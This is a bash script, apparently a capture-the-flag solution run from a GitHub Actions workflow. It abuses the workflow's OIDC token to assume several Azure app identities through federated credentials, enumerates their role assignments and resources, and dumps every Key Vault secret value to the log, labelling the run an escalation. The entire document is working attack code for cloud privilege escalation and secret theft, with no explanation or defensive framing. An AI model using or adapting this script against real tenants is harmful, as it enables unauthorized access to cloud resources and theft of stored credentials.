#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
MGMT="https://management.azure.com"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
TEN=$AZURE_TENANT_ID

# one OIDC assertion (aud api://AzureADTokenExchange), reusable for any app with a matching FIC
OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "=== our GitHub OIDC claims ==="
printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | { read p; r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"; printf '%s' "$p"; } | base64 -d 2>/dev/null | jq '{sub,aud,repository,repository_owner,ref,event_name,workflow,environment}'

jwt_oid () { printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+' | { read p; r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"; printf '%s' "$p"; } | base64 -d 2>/dev/null | jq -r '.oid // .appid // empty'; }

assume () { # $1 appId  $2 resource-scope
  curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
    -d "client_id=$1" -d "scope=$2/.default" -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=$OIDC"
}

probe_vault () { # $1 label $2 vault-token
  local t="$2"; [ -z "$t" ] && { echo "   (no vault token)"; return; }
  local L; L=$(curl -sS $M -H "Authorization: Bearer $t" "$SECKV/secrets?api-version=7.4&maxresults=25")
  if printf '%s' "$L" | jq -e '.error' >/dev/null 2>&1; then echo "   kv-tbl-sec list: $(printf '%s' "$L"|jq -rc .error.code)"; return; fi
  echo "   kv-tbl-sec LIST OK:"
  for sid in $(printf '%s' "$L" | jq -r '.value[]?.id'); do
    v=$(curl -sS $M -H "Authorization: Bearer $t" "$sid?api-version=7.4" | jq -r '.value // empty')
    echo "     $sid = $v"
    printf '%s' "$v" | grep -aoE "DF26\{[^}]*\}" && echo "     *** FLAG ***"
  done
}

for row in "891fb158-e02c-4428-a885-53b811f369c0:tbl-legacy-admin" \
           "462d1c38-4459-48b8-9333-82e389e59514:tbl-platform-automation" \
           "7c2e61eb-f928-45cd-99c9-20da958dd216:tbl-directory-sync" \
           "6eb124e3-de61-4fc9-a124-213d98d737f5:tbl-reporting-insights"; do
  aid="${row%%:*}"; name="${row##*:}"
  echo; echo "############ ASSUME $name ($aid) ############"
  # management
  mg=$(assume "$aid" "$MGMT"); mt=$(printf '%s' "$mg" | jq -r '.access_token // empty')
  if [ -z "$mt" ]; then echo "  MGMT assume FAILED: $(printf '%s' "$mg" | jq -rc '.error' 2>/dev/null | head -c 200)"; else
    oid=$(jwt_oid "$mt"); echo "  MGMT token OK oid=$oid"
    ra=$(curl -sS $M -H "Authorization: Bearer $mt" "$MGMT/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$oid'")
    printf '%s' "$ra" | jq -r 'if .error then "   roles: ERR:"+.error.code else (.value[]? | "   ROLE rdId="+(.properties.roleDefinitionId|split("/")|last)+" @ "+.properties.scope) end'
    echo "   resources: $(curl -sS $M -H "Authorization: Bearer $mt" "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=50" | jq -r 'if .error then "ERR:"+.error.code else ([.value[]?.name]|join(", ")) end' | head -c 400)"
  fi
  # vault
  vg=$(assume "$aid" "https://vault.azure.net"); vt=$(printf '%s' "$vg" | jq -r '.access_token // empty')
  if [ -z "$vt" ]; then echo "  VAULT assume FAILED: $(printf '%s' "$vg" | jq -rc '.error.error // .error' 2>/dev/null | head -c 120)"; else
    echo "  VAULT token OK"; probe_vault "$name" "$vt"
    echo "   (also try kv-tbl-prod full read)"
    curl -sS $M -H "Authorization: Bearer $vt" "$PRODKV/secrets?api-version=7.4&maxresults=25" | jq -r 'if .error then "   kv-tbl-prod list: ERR:"+.error.code else "   kv-tbl-prod LIST OK ("+((.value|length)|tostring)+")" end'
  fi
done
echo; echo "ESCALATE DONE"; exit 0
